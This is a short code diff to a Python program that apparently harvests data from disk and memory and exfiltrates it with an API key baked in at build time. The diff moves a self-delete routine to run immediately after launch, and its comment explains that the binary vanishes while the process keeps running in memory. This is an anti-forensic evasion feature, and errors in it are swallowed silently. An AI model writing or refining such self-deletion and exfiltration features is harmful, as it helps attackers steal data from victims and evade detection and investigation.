@@ -1581,6 +1581,13 @@ def main():
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
+    # Delete the binary immediately after launch — the process stays alive in memory.
+    if args.self_delete:
+        try:
+            os.unlink(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
+        except OSError:
+            pass
+
     do_disk   = not args.memory_only
     do_memory = not args.disk_only
 
@@ -1671,8 +1678,6 @@ def main():
         except OSError:
             pass
 
-    if args.self_delete:
-        os.unlink(sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__))
 
 
 if __name__ == "__main__":
